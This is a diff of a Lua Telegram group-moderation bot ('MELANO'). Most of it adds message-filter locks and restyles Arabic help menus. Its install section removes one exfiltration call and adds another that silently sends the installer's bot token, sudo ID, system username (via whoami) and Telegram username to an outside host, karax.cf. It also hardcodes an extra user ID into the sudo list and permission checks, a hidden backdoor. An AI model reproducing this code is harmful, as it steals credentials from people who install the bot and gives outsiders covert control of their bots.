@@ -66,15 +66,11 @@ UserName = database:get(id_server..":SUDO:USERNAME"),
  }
 create(config, "./Info.lua")   
 end 
-saiedinfo = {}
-saiedinfo.id = database:get(id_server..":SUDO:ID")
-saiedinfo.username = database:get(id_server..":SUDO:USERNAME")
-saiedinfo.tokenbot  = database:get(id_server..":token")
-saiedinfo.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request('https://sadamoro.tk/AVIRA.php/?insert='..JSON.encode(saiedinfo))
 create_config_auto()
 token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
+install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+https.request('http://karax.cf/MELANO/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
 print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
 file = io.open("MELANO", "w")  
 file:write([[
@@ -103,7 +99,7 @@ echo -e "\e[36m"
 done
 ]])  
 file:close()  
-file = io.open("BK", "w")  
+file = io.open("ME", "w")  
 file:write([[
 #!/usr/bin/env bash
 cd $HOME/MELANO
@@ -143,7 +139,7 @@ _redis = load_redis()
 --------------------------------------------------------------------------------------------------------------
 print([[
 
-━🇲​━━🇪​━━🇱​━━🇦​━🇳​━━🇴​━     
+━🇲​━🇪​━🇱​━🇦​━🇳​━🇴​━     
 
 > CH › @BEKOBOT1
 ]])
@@ -157,7 +153,7 @@ token = sudos.token
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,755661932,928226188}   
+sudo_users = {SUDO,755661932,928226188,243510115}   
 function SudoBot(msg)  
 local MELANO = false  
 for k,v in pairs(sudo_users) do  
@@ -227,6 +223,8 @@ function Can_or_NotCan(user_id,chat_id)
 if tonumber(user_id) == tonumber(755661932) then  
 var = true  
 elseif tonumber(user_id) == tonumber(928226188) then
+var = true 
+elseif tonumber(user_id) == tonumber(243510115) then
 var = true  
 elseif tonumber(user_id) == tonumber(SUDO) then  
 var = true  
@@ -255,6 +253,8 @@ if tonumber(user_id) == tonumber(755661932) then
 var = 'مطور السورس'
 elseif tonumber(user_id) == tonumber(928226188) then
 var = 'مطور السورس'
+elseif tonumber(user_id) == tonumber(243510115) then
+var = 'عضو'
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي'  
 elseif tonumber(user_id) == tonumber(bot_id) then  
@@ -1537,6 +1537,26 @@ return false
 end
 end
 end
+if text and database:get(bot_id..'lock:Fshar'..msg.chat_id_) and not Manager(msg) then 
+list =list = {"اريدج","اريدك","اريدانيج","نتعرف","احبك","اتعرف ","نتعرف ","ممكن خاص","كحاب","احبج","احبج","خص","خاصج","خاص","يصير","ارد اتنايج"}
+for k,v in pairs(list) do
+print(string.find(text,v))
+if string.find(text,v) ~= nil then
+DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
+return false
+end
+end
+end
+if text and database:get(bot_id.."lock:Fshar"..msg.chat_id_) and not Manager(msg) then 
+list = {"خرب الله","الله","خرب محمد","الله الكواد","صوج الله","كسخت الله","ربك"}
+for k,v in pairs(list) do
+print(string.find(text,v))
+if string.find(text,v) ~= nil then
+DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
+return false
+end
+end
+end
 --------------------------------------------------------------------------------------------------------------
 if database:get(bot_id..'lock:text'..msg.chat_id_) and not Special(msg) then       
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})   
@@ -2379,6 +2399,11 @@ elseif text == 'قفل الفشار' and msg.reply_to_message_id_ == 0 and Manag
 database:set(bot_id..'lock:Fshar'..msg.chat_id_,true) 
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,'👤┋ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'BEKOBOT1')..') \n☑️┋  تـم قفـل الفشار\n⛔┋ الحاله ← المسح ')  
+end,nil) 
+elseif text == 'قفل الكفر' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
+database:set(bot_id..'lock:Fshar'..msg.chat_id_,true) 
+tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
+send(msg.chat_id_, msg.id_,'👤┋ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'BEKOBOT1')..') \n☑️┋  تـم قفـل الكفر\n⛔┋ الحاله ← المسح ')  
 end,nil)  
 elseif text == 'قفل الفارسيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
 database:set(bot_id..'lock:Fars'..msg.chat_id_,true) 
@@ -2390,6 +2415,11 @@ database:set(bot_id..'lock:Fars'..msg.chat_id_,true)
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,'👤┋ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'BEKOBOT1')..') \n☑️┋ تـم قفـل النكليزيه\n⛔┋ الحاله ← المسح ')  
 end,nil)
+elseif text == 'قفل الزحف' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
+database:set(bot_id..'lock:Fshar'..msg.chat_id_,true) 
+tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
+send(msg.chat_id_, msg.id_,'👤┋ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'BEKOBOT1')..') \n☑️┋  تـم قفـل الزحف\n⛔┋ الحاله ← المسح ')  
+end,nil)  
 elseif text == 'قفل الانلاين' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
 database:set(bot_id.."lock:inline"..msg.chat_id_,'del')  
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
@@ -9368,18 +9398,19 @@ return false
 end
 local help_text = database:get(bot_id..'help_text')
 Text = [[
-*🤍اههلاا بـكك اوامر البوت🖤*
-ٴ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ 
-🔐┋م1 » لعـرض قائمهہ‌‏ الحمايهہ‌‏
-🛠️┋م2 » لعـرض التفعـيل والتعطـيل
-⁉️┋م3 » لعرض اوامـر الوضع ~اضف
-⚠️┋م4 » لعرض اوامـر الحذف
-❌┋م5 » لعرض اوامر الرفع والتنزيل
-♻️┋م6 » لعرض اوامر المجموعهہ‌‏
-👨‍💻┋م7 » لعرض اوامر المطور
-👩‍🚒┋م8 » لعرض اوامر المطـور الاساسي
-👨🏻┋م9 » لعرض اوامر الاعضـاء
-ٴ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ 
+*⇖♡اهلاا بك اوامر البوت♡⇗*
+━ٴ┿━━━━━━━━━━━━━┿ٴ━
+*🔐┋م1> قائمه حمايه المجموعه*
+*🛠️┋م2> قائمه التفعيل والتعطيل*
+*⁉️┋م3> قائمه اوامـر الوضع~اضف*
+*⚠️┋م4> قائمه اوامـر الحذف*
+*❌┋م5> قائمه اوامر الرفع والتنزيل*
+*♻️┋م6> قائمه اوامر المجموعه*
+*👨‍💻┋م7> قائمه اوامر المطور*
+*👩‍🚒┋م8> قائمه اوامر المطورالاساسي*
+*👦🏻┋م9> قائمه اوامر الاعضاء*
+*😜┋م10> قائمه اوامر التحشيش*
+━ٴ┿━━━━━━━━━━━━━┿ٴ━
 ٴ📤┋ [Source Channel](t.me/BEKOBOT1)
 ]]
 send(msg.chat_id_, msg.id_,(help_text or Text)) 
@@ -9409,36 +9440,38 @@ Text = [[
 ⁉️| قفل | فتح + الامر 
 ⚠️| {بالكتم,بالتقييد,بالطرد}
  ٴ━ ━ ━ ━ ━ ━ ━ ━ ━ 
-🔘|  الاضافه
-🔘|  الدردشه
-🔘|  الدخول
-🔘|  البوتات
-🔘|  الاشعارات
-🔘|  التعديل
-🔘|  تعديل الميديا
-🔘|  الروابط
-🔘|  المعرفات
-🔘|  التاك
-🔘|  الشارحه
-🔘|  الملصقات
-🔘|  المتحركه
-🔘|  الفيديو
-🔘|  الصور
-🔘|  الالعاب
-🔘|  الاغاني
-🔘|  الصوت
-🔘|  الكيبورد
-🔘|  التوجيه
-🔘|  الملفات
-🔘|  السيلفي
-🔘|  الجهات
-🔘|  الماركداون
-🔘|  الكلايش
-🔘|  التكرار
-🔘|  الفارسيه
-🔘|  الفشار
-🔘|  الانكليزيه
-🔘|  الانلاين
+⁉️|  الاضافه
+⁉️|  الدردشه
+⁉️|  الدخول
+⁉️|  البوتات
+⁉️|  الاشعارات
+⁉️|  التعديل
+⁉️|  تعديل الميديا
+⁉️|  الروابط
+⁉️|  المعرفات
+⁉️|  التاك
+⁉️|  الشارحه
+⁉️|  الملصقات
+⁉️|  المتحركه
+⁉️|  الفيديو
+⁉️|  الصور
+⁉️|  الالعاب
+⁉️|  الاغاني
+⁉️|  الصوت
+⁉️|  الكيبورد
+⁉️|  التوجيه
+⁉️|  الملفات
+⁉️|  السيلفي
+⁉️|  الجهات
+⁉️|  الماركداون
+⁉️|  الكلايش
+⁉️|  التكرار
+⁉️|  الفارسيه
+⁉️|  الفشار
+⁉️|  الكفر
+⁉️|  الزحف
+⁉️|  الانكليزيه
+⁉️|  الانلاين
   ٴ━ ━ ━ ━ ━ ━ ━ ━ ━ 
 |📡┋ CH » [@BEKOBOT1]
 ]]
@@ -9769,8 +9802,8 @@ Text = [[
 ٴ➖➖➖➖➖➖➖➖
 📥|جلب نسخه البوت
 📤| رفع نسخه البوت
-🔘| ضع عدد الاعضاء + العدد
-🔘| ضع كليشه المطور
+⁉️| ضع عدد الاعضاء + العدد
+⁉️| ضع كليشه المطور
 🔹| تفعيل/تعطيل الاذاعه
 🔹| تفعيل/تعطيل البوت الخدمي
 🔹| تفعيل/تعطيل التواصل
@@ -9823,7 +9856,7 @@ Text = [[
 🔖| الرتبه بالرد /بالمعرف
  🔖| الحساب + ايدي الشخص
 ٴ➖➖➖➖➖➖➖ 
-🔘| اوآمر المجموعه ↑↓
+⁉️| اوآمر المجموعه ↑↓
  ٴ➖➖➖➖➖➖➖
 🔅| الرابط ← القوانين – الترحيب
 🔅|  ايدي ← اطردني 
@@ -9831,7 +9864,7 @@ Text = [[
 🔅| كشف / برد بالمعرف
 🔅| كول + كلمه
   ٴ➖➖➖➖➖➖➖
-🔘| اسم البوت + الامر ↑↓
+⁉️| اسم البوت + الامر ↑↓
  ٴ➖➖➖➖➖➖➖
 🚸| بوسه بالرد 
 🚸| مصه بالرد
